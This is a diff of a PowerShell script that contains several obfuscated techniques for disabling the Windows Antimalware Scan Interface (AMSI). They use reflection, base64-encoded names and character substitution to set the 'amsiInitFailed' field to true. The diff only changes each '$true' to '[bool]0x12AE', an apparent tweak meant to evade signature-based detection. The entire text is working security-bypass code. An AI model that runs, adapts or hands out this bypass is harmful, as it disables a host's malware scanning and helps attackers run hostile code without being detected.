@@ -277,7 +277,7 @@ ElseIf($Technic -eq 2)
       $Rawdata = $fdx.Replace('@','a').Replace('£','i').Replace('+','e')
       $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
       $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
-      $Spotfix.SetValue($null,$true)
+      $Spotfix.SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
 ElseIf($Technic -eq 3)
@@ -299,7 +299,7 @@ ElseIf($Technic -eq 3)
       $Drawing = "Sy@ste+.M@ana"+"ge+e@nt" + ".Auto@+ati@on."+"A+s@i" + "U@ti@ls" -Join ''
       $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
       $imgForm = $Drawing.Replace("@","").Replace("+","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
-      $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)
+      $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
 ElseIf($Technic -eq 4)
@@ -319,7 +319,7 @@ ElseIf($Technic -eq 4)
       [Ref].Assembly.GetType($('Syst'+'em.Manag'+'ement.Autom'+'ation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+
       $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA='))+
       $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA='))))+
-      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
+      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
 
